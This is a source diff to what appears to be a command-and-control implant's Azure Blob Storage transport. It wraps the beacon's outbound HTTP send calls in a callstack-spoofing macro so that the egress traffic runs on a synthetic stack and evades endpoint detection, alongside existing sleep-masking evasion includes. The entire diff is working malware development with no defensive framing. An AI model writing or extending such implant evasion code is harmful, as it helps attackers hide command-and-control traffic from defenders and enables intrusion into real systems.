@@ -5,6 +5,17 @@
 #include "transport_azure_blob.h"
 #include "evasion/sleepmask.h"
 
+// LACUNA synthetic-stack dispatch (see transport/http.cc)
+#if defined(INCLUDE_EVASION_CALLSTACK_SPOOF) && defined(_WIN64)
+#include "evasion/callstack_spoof.h"
+#define ES_SPOOFED(inst, fn, n, ...) \
+    callstack_spoofed_call((inst), (PVOID)(fn), (n), ##__VA_ARGS__)
+#else
+#define ghost_chain_plant(inst)      ((void)0)
+#define ghost_chain_restore(inst)    ((void)0)
+#define ES_SPOOFED(inst, fn, n, ...) ((PVOID)(UINT64)(fn)(__VA_ARGS__))
+#endif
+
 // ── Azure Blob Storage transport ────────────────────────────────────────────
 //
 // Protocol (see the azure_blob C2 profile):
@@ -139,7 +150,10 @@ static DWORD blob_request(PINSTANCE inst, const char* verb, const char* path,
     }
     hdr[hp] = 0;
 
-    BOOL sent = inst->Win32.HttpSendRequestA(hReq, hdr[0] ? hdr : NULL, hp, body, body_len);
+    // Egress send on the synthetic stack (see transport/http.cc)
+    BOOL sent = (BOOL)(UINT_PTR)(UINT64)ES_SPOOFED(
+        inst, inst->Win32.HttpSendRequestA, 5,
+        hReq, (hdr[0] ? hdr : NULL), hp, body, body_len);
     DWORD status = 0;
     if (sent) {
         DWORD sz = sizeof(status);
@@ -213,8 +227,11 @@ static DWORD blob_request(PINSTANCE inst, const char* verb, const char* path,
     }
 
     DWORD status = 0;
-    BOOL sent = inst->Win32.WinHttpSendRequest(hReq, (LPCWSTR)WINHTTP_HEADER_NAME_BY_INDEX, 0,
-                                               body, body_len, body_len, 0);
+    // Egress send on the synthetic stack (see transport/http.cc)
+    BOOL sent = (BOOL)(UINT_PTR)(UINT64)ES_SPOOFED(
+        inst, inst->Win32.WinHttpSendRequest, 7,
+        hReq, (LPCWSTR)WINHTTP_HEADER_NAME_BY_INDEX, 0,
+        body, body_len, body_len, 0);
     if (sent && inst->Win32.WinHttpReceiveResponse(hReq, NULL)) {
         DWORD sz = sizeof(status);
         inst->Win32.WinHttpQueryHeaders(hReq,
